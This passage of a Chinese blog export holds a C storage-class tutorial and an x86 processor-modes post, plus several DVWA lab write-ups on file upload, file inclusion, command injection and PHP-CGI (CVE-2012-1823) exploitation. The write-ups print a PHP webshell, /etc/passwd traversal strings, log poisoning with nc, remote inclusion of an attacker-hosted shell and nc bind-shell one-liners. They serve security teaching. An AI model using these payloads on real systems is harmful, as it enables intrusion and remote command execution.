linkage）。&emsp;&emsp;具有代码块作用域或者函数原型作用域的变量有空链接，意味着由其定义在定义所在的代码块或函数原型所私有的。具有文件作用域的变量有内部链接或外部内接。一个具有外部链接的变量可以在多文件程序中使用；一个具有内部链接的变量可以在一个文件中的任何地方使用（存储类说明符static）。 123456int a = 10; //文件作用域，外部链接static int b = 20 //文件作用域，内部链接int main()&#123; ...&#125; 存储时期&emsp;&emsp;一个C变量具有静态存储时期（static storage duration）和自动存储时期（automatic storage duration）。一个变量具有静态存储时期，它在程序执行期间一直存在。具有文件作用域的变量具有静态存储时期。注：对于具有文件作用域的变量，关键词static表明链接，并非存储时期。所有的文件作用域变量都具有静态存储时期&emsp;&emsp;具有代码块作用域的变量一般情况下具有自动存储时期。在程序定义这些变量的代码中，将为这些变量分配内存，退出该代码块，分配的内存就会被释放。当然也具有静态存储时期、代码块作用域的变量，只要在声明前添加static关键字。 五种存储类自动&emsp;&emsp;在一个代码块内（或一个函数头部作为参量）声明的变量属于自动存储类，这些变量具有自动存储时期、代码块作用域和空连接。默认情况下，代码块或函数头部的变量属于自动存储类，当然也可以用关键字auto显式表明。未经初始化值不固定。 123int main()&#123; auto int a; 寄存器&emsp;&emsp;在一个代码块内（或一个函数头部作为参量）使用存储类说明符register声明的变量属于寄存器存储类。这些变量具有代码块作用域、空连接以及自动存储时期，同时被访问的速度最快，因为存储在寄存器中，但不能使用地址运算符获取地址。未经初始化值不固定。 123int main(void)&#123; register int a; 静态、空连接&emsp;&emsp;在一个代码块内使用存储类修饰符static声明的变量属于静态空链接存储类。该类具有静态存储时期、代码块作用域和空链接。仅在编译时初始化一次。未经初始化值为0。 123void test()&#123; static int a; 静态、外部链接&emsp;&emsp;在所有函数外、未使用存储类修饰符static声明的变量属于静态外部链接存储类。该类具有静态存储时期、文件作用域和外部链接。仅在编译时初始化一次。未经初始化值为0。 静态、内部链接&emsp;&emsp;在所有函数外、使用了存储类修饰符static声明的变量属于静态外部链接存储类。该类具有静态存储时期、文件作用域和内部链接。仅在编译时初始化一次。未经初始化值为0。 参考《C Primer Plus》&emsp;&emsp;包含五种存储类的小程序 12345678910111213141516171819202122232425262728// parta.c -- 各种存储类#include &lt;stdio.h&gt;void report_count();void accumulate(int k);int count = 0; // 文件作用域，外部链接int main(void)&#123; int value; // 自动变量 register int i; // 寄存器变量 printf("Enter a positive integer(0 to quit):"); while (scanf("%d", &amp;value) == 1 &amp;&amp; value &gt; 0) &#123; ++count; // 使用文件作用域变量 for (i = value; i &gt;= 0; i--) &#123; accumulate(i); &#125; printf("Enter a positive integer(0 to quit):"); &#125; report_count(); return 0;&#125;void report_count()&#123; printf("Loop execute %d times\n", count);&#125; 12345678910111213141516171819202122// partb.c -- 程序的其余部分#include &lt;stdio.h&gt;extern int count; //引用声明， 外部链接static int total = 0; // 静态定义， 内部链接void accumulate(int k); // 原型void accumulate(int k)&#123; static int subtotal = 0; //静态、空链接 if (k &lt;= 0) &#123; printf("loop cycle: %d\n", count); printf("subtotal: %d; total: %d\n", subtotal, total); subtotal = 0; &#125; else &#123; subtotal += k; total += k; &#125;&#125; 程序运行结果： 1234567891011Enter a positive integer(0 to quit):5loop cycle: 1subtotal: 15; total: 15Enter a positive integer(0 to quit):10loop cycle: 2subtotal: 55; total: 70Enter a positive integer(0 to quit):2loop cycle: 3subtotal: 3; total: 73Enter a positive integer(0 to quit):0Loop execute 3 times 注：extern 有两个作用，1.在声明一个外部变量后，为使程序逻辑清晰，可以通过extern再次声明；2.当其他文件定义一个外部变量需要使用时，要通过extern来进行引用声明 12345678// temp是其他文件的变量（多文件编译）extern int temp; /* 必须声明 */int arr[100];int local;int main(void)&#123; extern int local; /* 可选声明 */ extern int arr[]; /* 可选声明 */ 内存管理&emsp;&emsp;当约定使用哪种存储，就自动决定了作用域与存储时期。这是预先的内存管理机制，初次之外可以通过库函数分配和管理内存，提供程序灵活性。一些内存分配都是自动完成的。 123double x;char arr[] = "Hello, world!";int num[10]; malloc() &amp; free()C的功能远不止这些，这里用到的malloc()函数maclloc函数接收一个参数——内存字节数。它会在内存中找到合适的内存块，内存是匿名的，所以它会返回那块内存的第一个字节的地址。因此，它可以赋值给指针。 1234double * ptd;ptd = (double *) malloc(30 * sizeof(double));...free(ptd); 这里声明了一个指针ptd，(double *)是返回的类型，30 * sizeof(double)是30个double字节大小的内存。返回的地址赋给指针ptd，如果内存未分配成功，就返回空指针（NULL）。当该指针指向的内存不在使用，可以用free()释放内存。 程序示例: 1234567891011121314151617181920212223242526272829303132333435363738394041/* dyn_arr.c 为数组动态分配空间 */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // 为malloc()和free()函数提供原型int main(void)&#123; double * ptd; int max; int number; int i = 0; puts("What is the maxium number of type double entries?"); scanf("%d", &amp;max); ptd = (double *)malloc(max * sizeof(double)); if (ptd == NULL) &#123; puts("Memory allocation failed. Goodbye."); exit(EXIT_FAILURE); &#125; /* ptd现在指向由max个元素的数组 */ puts("Enter the values(q to quit): "); while (i &lt; max &amp;&amp; scanf("%lf", &amp;ptd[i]) == 1) &#123; i++; &#125; printf("Here are your %d entries: \n", number = i); for ( i = 0; i &lt; number; i++) &#123; printf("%7.2f", ptd[i]); if (i % 7 == 6) &#123; putchar('\n'); &#125; &#125; if (i % 7 != 0) &#123; puts("\n"); &#125; puts("Done."); free(ptd); return 0;&#125; 运行结果： 12345678What is the maxium number of type double entries?5Enter the values(q to quit):20 30 40 50 55 80Here are your 5 entries: 20.00 30.00 40.00 50.00 55.00Done. calloc()内存分配还可以使用calloc（），如下 12long * ptd;ptd = (long *) calloc(100, sizeof(long)) calloc()接收两个参数，第一个是内存单元数，第二个是每个单元以字节计的大小,与malloc()类似。 ANSI C 类型限定词&emsp;&emsp;一个变量是以它的类型和存储类表征的。C90增加两个属性：不变性和易变性——关键字const和volatile。这样就创建了受限类型（qualified type）。C99又添加了一个限定词restrict，用以方便编译器优化。 const示例： 123456const int a = 10； // 限定为常量a = 20; // 编译器报错，不可更改~~~ 数组~~~Cconst int arr[5] = &#123;1, 2, 3, 4, 5&#125;; 指针 123const float * pf; /* pf指向一个常量浮点数 */float const * pf; /* 同上 */float * const pf; /* pf是一个常量指针 */ 函数参量 12void test(const int arr[], int n);char * strcat(char *, const char *); volatile示例： 12volatile int locl; /* locl 是一个易变的位置 */volatile int * ploc; /* ploc 指向一个易变的位置 */ &emsp;&emsp;volatile 关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。例如， 123val1 = x;... // 其他代码，并未明确告诉编译器，对 x进行过操作val2 = x; &emsp;&emsp;编译器会发现您对x值进行两次操作，val1赋值后，它会把x临时存放到一个寄存器，到val2时，直接把寄存器中的x值赋给val2，这种过程叫做“缓存”。如果中间嵌入汇编代码对x进行修改，编译器就无法及时得知x改变。volatile就可以提醒编译器x是一个随时可能变化的值。 restrict&emsp;&emsp;restrict只用于指针，表明指针是访问一个数据对象的唯一的且初始的方式，也可用于编译器优化。举书上两个例子 1234567891011int ar[10];int * restrict restar = (int *)malloc(10 * sizeof(int));int * par = ar;for(n = 0; n &lt; 10; n++)&#123; par[n] += 5; restar[n] += 5; ar[n] *= 2; par[n] += 3; restar[n] += 3;&#125; 通过restrict修饰后，编译器就会进行优化，用同样效果的语句来代替restar的两个语句，如： 12345678910int ar[10];int * restrict restar = (int *)malloc(10 * sizeof(int));int * par = ar;for(n = 0; n &lt; 10; n++)&#123; par[n] += 5; restar[n] += 8; // 优化后 ar[n] *= 2; par[n] += 3;&#125; restrict在函数参量中使用可以防止内存重叠, C99中的两个库函数原型： 12void * memcpy(void * restrict s1, const void * restrict s2, size_t n);void * memmove(void * s1, const void * s2, size_t n);]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动漏洞挖掘（四）-文件上传漏洞]]></title>
    <url>%2F2019%2F11%2F04%2F%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%88%E5%9B%9B%EF%BC%89-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 漏洞成因 对于上传文件的后缀名（扩展名）没有做较为严格的限制 对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查 权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件） 对于web server对于上传文件或者指定目录的行为没有做限制 常用绕过方法 iis6.0解析漏洞目录解析漏洞：如果网站目录中存在/.asp/的目录，那么在此目录下的文件会被当作asp脚本解析。分号漏洞：如test.asp;jpg,可绕过黑名单限制。 apache解析漏洞文件名test.xxx.yyy.zzz,apache会从右往左解析（zzz-&gt;yyy-&gt;xxx），如果xxx格式解析不出来，就会尝试解析yyy格式，如test.php.rar,apache不会解析rar文件，就会解析成php文件。 Nginx解析漏洞 test.jpg/x.php进行解析攻击 空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行 00截断截断的核心，就是chr(0)这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！ 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 。 大小写绕过如test.pHp 、 test.aSP; 绕过js前端限制 MIMETYPE检测绕过的方法就是通过修改Content-Type的值，修改为image/jpeg；image/png；image/gif等在kali中有一个工具mimetype可以判断内容类型（Content-Type） 12root@kali:~/test# mimetype shell.php shell.php: application/x-php 文件头修改以16进制形式打开文件，修改文件头；有些网站会对文件的头部信息进行判断，如果不符合条件就会被过滤，因此通过修改头部信息进行伪装可以绕过这种检查 123JPEG (jpg)，文件头：FFD8FFPNG (png)，文件头：89504E47GIF (gif)，文件头：47494638 漏洞PoC编写一个简单的php木马文件,保存位shell.php 1&lt;?php echo shell_exec($_GET['cmd']);?&gt; 上传成功返回的路径信息../../hackable/uploads/shell.php通过浏览器执行木马 1http://10.0.2.5/dvwa/hackable/uploads/shell.php 源码分析low1234567891011121314151617181920 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; //拼接路径 $target_path = $target_path . basename( $_FILES['uploaded']['name']); if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。 若成功,则返回 true,否则返回 false。由于low级别代码没有做任何限制所以可以上传任意格式的文件 medium1234567891011121314151617181920212223242526 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; $target_path = $target_path . basename($_FILES['uploaded']['name']); $uploaded_name = $_FILES['uploaded']['name']; $uploaded_type = $_FILES['uploaded']['type']; $uploaded_size = $_FILES['uploaded']['size']; if (($uploaded_type == "image/jpeg") &amp;&amp; ($uploaded_size &lt; 100000))&#123; if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125; else&#123; echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; &#125;?&gt; medium级别的代码添加了一定的限制，上传的文件大小于100k且mimetype类型为image/jpeg只需要将Content-Type: application/x-php修改为Content-Type: image/jpeg大小也可以做修改这样即可绕过限制 high123456789101112131415161718192021222324252627282930 &lt;?phpif (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; $target_path = $target_path . basename($_FILES['uploaded']['name']); $uploaded_name = $_FILES['uploaded']['name']; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); // $uploaded_size = $_FILES['uploaded']['size']; if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") &amp;&amp; ($uploaded_size &lt; 100000))&#123; if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125; else&#123; echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; substr(string,start,length) 截取字符串strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。 注释：strrpos() 函数是区分大小写的。相关函数： strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写） stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） 虽然是high级别的代码，但仍有办法绕过，在shell.php后面添加.jpg后缀—shell.php.jpg，即可绕过代码限制，然后利用apache解析脚本的特性，就可以执行php的代码执行上传的php木马 漏洞防御代码做了多层的防护，还是可以被绕过；其实有效的防御方法是让上传的文件没有执行权限这里的uploads所属用户是www-data，并且所有用户都有可以执行的权限去掉所有用户的可执行权限 1sudo chmod a-x uploads/ 此时再次执行php木马，就会因权限不足而被禁止访问 参考文件上传限制绕过的原理以及方法总结文件上传漏洞常用文件格式十六进制文件头]]></content>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动漏洞挖掘（三）---目录遍历与文件包含漏洞]]></title>
    <url>%2F2019%2F11%2F03%2F%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%88%E4%B8%89%EF%BC%89-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[目录遍历（路径遍历）是由于web服务器配置错误或者web应用程序对用户输入的文件名称的安全性验证不足,使得攻击者通过利用一些特殊字符绕过服务器的安全限制,读取本地任意文件;文件包含是指可以通过特定函数将里一个文件的内容或代码加载至当前页面。如，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行;漏洞利用方法与目录遍历相差无几。 简介目录遍历(路径遍历)是由于服务器权限配置不当，攻击者访问本地任意的文件(可以是Web根目录以外的文件)造成信息泄露。文件包含漏洞与目录遍历漏洞类似，但还是有些区别，文件包含包括本地文件包含(LFI)和远程文件包含(RFI)。目录遍历可以理解为本地文件包含，而利用远程文件包含可以实现远程代码执行，危害巨大。 php的代码里，要想实现远程包含需要开启allow_url_include 12/etc/php5/cgi/php.iniallow_url_include = On 注： 有一种常见web漏洞叫目录浏览(Directory Browsing),这种漏洞会暴露网站的文件目录列表，与目录遍历容易混淆。 漏洞的常见特征 ?page=a.php ?home=b.html ?file=comtent 经典的测试方法12345?file=../../../../etc/passwd?page=file:///etc/passwd?home=main.cgi?page=http://www.a.com/1.phphttp://1.1.1.1/../../../../dir/file.txt 编码绕过字符过滤 “.” , “%00” # 绕过文件扩展名过滤 ?file=a.doc%00.php 使用多种编码尝试 不同操作系统的路径特征字符 类unix系统 根目录： / 目录层级分隔符： / Windows系统 C:\ \或/ 编码 url编码、双层url编码 %2E%2E%2F &emsp;&emsp;&emsp;&emsp;&emsp;解码：../ %2E%2E%5C &emsp;&emsp;&emsp;&emsp;&emsp;解码：..\ %252E%252E%255C &emsp;&emsp;&emsp;解码：../ Unicode/UTF-8编码 ..%c0%af &emsp;&emsp;&emsp;&emsp;&emsp;解码：../ ..%u2216 ..%c1%9c &emsp;&emsp;&emsp;&emsp;&emsp;解码：..\ 其他系统可能使用到的字符123456file.txt...file.txt&lt;spaces&gt;file.txt&quot;&quot;&quot;&quot;file.txt&lt;&lt;&lt;&gt;&gt;&gt;&lt;./././file.txtnonexistant/../file.txt UNC路径1\\1.1.1.1\path\file.txt 字典FUZZ除了上面的方法外，也可以通过字典的方式进行FUZZkali系统自带的针对目录遍历漏洞的字典 1/usr/share/wfuzz/wordlist/Injections/Traversal.txt 漏洞PoC测试： 1http://10.0.2.5/dvwa/vulnerabilities/fi/?page=include.php 本地文件包含 1?page=../../../../../etc/passwd 利用http协议实现远程文件包含(allow_url_include) 1?page=http://www.baidu.com 本地文件包含LFI通过日志文件实现代码执行 日志信息位置/var/log/apache2/access.log 要想实现该实验，必须拥有可以读和执行日志文件的权限。 1sudo chmod -R 755 /var/log/apache2/ 用nc想目标80 端口发送一句话木马 12root@kali:~# nc 10.0.2.5 80&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt; 查看日志信息，此时发送的信息就会被记录下来 通过本地文件包含漏洞执行代码 1?page=/var/log/apache2/access.log&amp;cmd=id 远程文件包含RFI在Kali机器创建shell.php文件 1&lt;?php echo shell_exec($_GET['cmd']);?&gt; 用python搭建简单的http服务器 12root@kali:~/test# python -m &quot;SimpleHTTPServer&quot;Serving HTTP on 0.0.0.0 port 8000 ... 远程包含攻击者的木马文件 1?page=http://10.0.2.15:8000/shell.php&amp;cmd=id 源码分析low1234&lt;?php $file = $_GET['page']; //The page we wish to display ?&gt; low级别的代码没有任何过滤，可直接利用 medium12345678 &lt;?php $file = $_GET['page']; // The page we wish to display // Bad input validation $file = str_replace("http://", "", $file); $file = str_replace("https://", "", $file); ?&gt; medium级别的代码做了一点防护，把”http://“，”https://“替换成空字符，因为只是做了一次替换，所以很好绕过只需在”http://“中在加入一个”http://“ 1?page=hthttp://tp://www.baidu.com high12345678910 &lt;?php $file = $_GET['page']; //The page we wish to display // Only allow include.php if ( $file != "include.php" ) &#123; echo "ERROR: File not found!"; exit; &#125; ?&gt; high级别的代码做了白名单限制，只允许include.php文件通过。]]></content>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动漏洞挖掘（二）---命令执行漏洞]]></title>
    <url>%2F2019%2F11%2F02%2F%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%88%E4%BA%8C%EF%BC%89-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[命令执行漏洞概念：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。 漏洞分析漏洞成因：脚本语言优点是简洁，方便，但也伴随着一些问题，如速度慢，无法解除系统底层，如果我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。 在操作系统中，“;、 &amp;、 &amp;&amp;、 |、 ||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。 如“ ping 127.0.0.1 -c 1;ls /” 在执行完ping命令后还会执行ls，列出根目录的文件 1234567891011root@kali:~# ping 127.0.0.1 -c 1;ls /PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 msbin etc initrd.img.old media root sys usrboot ftphome lib mnt run test varburpsuite1.6pro home lib64 opt sbin tftp vmlinuzdev initrd.img lost+found proc srv tmp vmlinuz.old 漏洞演示如下是一个基于ping命令的网页程序 用”;”来闭合前面的命令输入”;pwd” 也可以用“ &amp; ” 源码分析low12345678910111213141516 &lt;?phpif( isset( $_POST[ 'submit' ] ) ) &#123; $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if (stristr(php_uname('s'), 'Windows NT')) &#123; $cmd = shell_exec( 'ping ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125; else &#123; $cmd = shell_exec( 'ping -c 3 ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125; &#125;?&gt; 因为windows与linux的命令有些不同，这里就进行if判断，但是在命令执行函数shell_exec()执行前没有做任何过滤检测，所以攻击者很轻松就可以利用此漏洞。 medium12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'submit'] ) ) &#123; $target = $_REQUEST[ 'ip' ]; // Remove any of the charactars in the array (blacklist). $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if (stristr(php_uname('s'), 'Windows NT')) &#123; $cmd = shell_exec( 'ping ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125; else &#123; $cmd = shell_exec( 'ping -c 3 ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125;&#125;?&gt; medium级别的代码对用户输入的值做了一定的处理，这里过滤了“;”,“&amp;&amp;”；不过这还是很容易绕过，毕竟拼接命令的符号不止这两个，比如“||”。这样就成功绕过了。 high123456789101112131415161718192021 &lt;?phpif( isset( $_POST[ 'submit'] ) ) &#123; $target = $_REQUEST[ 'ip' ]; // Remove any of the charactars in the array (blacklist). $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if (stristr(php_uname('s'), 'Windows NT')) &#123; $cmd = shell_exec( 'ping ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125; else &#123; $cmd = shell_exec( 'ping -c 3 ' . $target ); echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;'; &#125;&#125;?&gt; high级别的代码，将用户输入的值分为四段，且每段必须为数字，即必须是IP地址的格式，避免了命令执行漏洞; 漏洞利用简单的漏洞利用打开本地的4444端口“;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe”用nc连接目标4444端口]]></content>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动漏洞挖掘（一）---phpMyAdmin默认安装漏洞]]></title>
    <url>%2F2019%2F10%2F25%2F%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%EF%BC%88%E4%B8%80%EF%BC%89-phpMyAdmin%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径。其中一个优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库。在早期的版本中，默认安装完成是存在漏洞的，比如通过访问phpMyAdmin/setup无需登录就可以对服务端进行修改 phpmyadmin/setup默认安装payload 12345678POST http://192.168.43.117/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.43.117Content-Length: 37&lt;?php passthru(&apos;id&apos;); die();?&gt; 通过提交参数修改php.ini配置文件，就可以执行请求中插入的php代码die函数作用是输出一条消息(这里为空)，并退出当前脚本，目的是过滤多余的信息。 当然还可以使用其他命令执行的函数，不过显示的效果不同 system()：直接输出所有结果并返回最后一行shell结果。 exec()：不输出所有结果而是显示结果的最后一行，所有结果可以保存到一个返回的数组里面。 passthru()：把命令执行的所有结果直接输出。 除了执行命令查看系统信息或文件外，还可以向服务器写入一句话木马 1234&lt;?php passthru('echo "&lt;?php \$cmd = \$_GET["cmd"];system(\$cmd);?&gt;" &gt; /var/www/shell.php'); die();?&gt; （‘\’的作用的转义） 这样就可以通过浏览器直接执行系统命令 写入php反弹shell可以用kali中自带的shell（/usr/share/webshells/php/php-reverse-shell.php）用nc监听，发送payload就可以得到一个目标系统的shell Debian/Ubuntu默认安装的PHP5-CGI 这是Apache和PHP的组合代码执行漏洞。在Debian和Ubuntu的漏洞存在于默认安装PHP5-CGI包。 payload 12345678POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.Host: 192.168.43.117Content-Length: 37&lt;?php passthru(&apos;id&apos;); die();?&gt; 上面的url编码语句，实际上就是一堆参数，用来提交给服务器修改配置。编码的作用是为了绕过检查机制 1-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -%6 主动打开目标服务器的端口，等待连接 1234&lt;?php system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);die();?&gt; 用nc连接目标服务器 参考：cgi-bin Remote Code ExecutionCVE-2012-1823（PHP-CGI RCE）的PoC及技术挑战 PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析]]></content>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[80x86处理器工作模式]]></title>
    <url>%2F2019%2F10%2F14%2F80x86%E5%A4%84%E7%90%86%E5%99%A8%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[80386的处理器有3种工作模式，分别是：实模式、保护模式和虚拟86模式。 实模式和虚拟86模式是为了和80386处理器兼容二设置的。 实模式下，80386就相当于一个快速的8086处理器。 保护模式是80386的主要工作模式。 在此模式下，80386可以有4GB的寻址空间，同时支持多任务，内存分页管理和优先级保护的功能。 而虚拟86模式是为了兼容8086程序而设计的，在此模式下可以支持认为切换，内存分页和优先级，但寻址方式和8086相同，寻址空间只有1MB。 实模式&emsp;&emsp;80386处理器在实模式下和8086是一样的，以 “段地址 × 16 + 偏移地址” 的方式寻址，这时它的32位地址线只使用了低20位 (8086的地址线为20根，寻址1MB)。 在实模式下，所有段都是可读，可写和可执行的。&emsp;&emsp;实模式下80386不支持优先级，所有指令都相当于工作在特权级（优先级 0），所以可以执行所有特权命令，包括读写控制寄存器CR0等。实际上。 80386就是复位或加电后，通过实模式启动并初始化控制寄存器，GTDR，LTDR，IDTR，和TR等管理寄存器，然后再加载CR0,修改控制寄存器CR0,使它的PE位为1,最后进入保护模式。 实模式下，同样使用中断向量表来中断服务。 控制寄存器(CR0,CR1,CR2,CR3) 保护模式&emsp;&emsp;在保护模式下，它的所有功能都是可用的。 32位的地址线都可供寻址，物理寻址达4GB。 支持内存分页机制，提供对虚拟内存的良好支持。&emsp;&emsp;保护模式下80386支持多任务，可以依靠一条指令实现任务切换。任务环境的保护工作是处理器自动完成的。80386还支持优先级机制（0-3)，操作系统运行在最高优先级0，应用程序运行在比较低的级别。&emsp;&emsp;DOS运行于实模式，windows运行于保护模式。 虚拟86模式&emsp;&emsp;虚拟86模式是为了在保护模式执行8086程序而设置的，就是为了向下兼容以前的程序。&emsp;&emsp;虚拟86模式是以任务形式在保护模式上执行，并且支持任务切换和内存分页。 也就是说，保护模式下，可以运行多个8086程序，采用 “段地址 × 16 + 偏移地址” 的方式形成线性地址（这里不是物理地址），寻址为1MB。很显然这里的 “1MB” 并非同一位置，而是操作系统利用分页机制分配的线性地址，然后映射到不同的物理地址。 补充&emsp;&emsp; 80386的3种模式各有特点且相互联系。实模式可以通过指令切换到保护模式，也可以通过指令从保护模式退回实模式；虚拟86模式以保护模式为基础，在保护模式和虚拟86模式之间相互切换；实模式和86模式之间不能相互直接切换。 参考：《Windows环境下32位汇编语言程序设计》]]></content>
      <categories>
        <category>Win32汇编</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>Win32汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-目遍历漏洞]]></title>
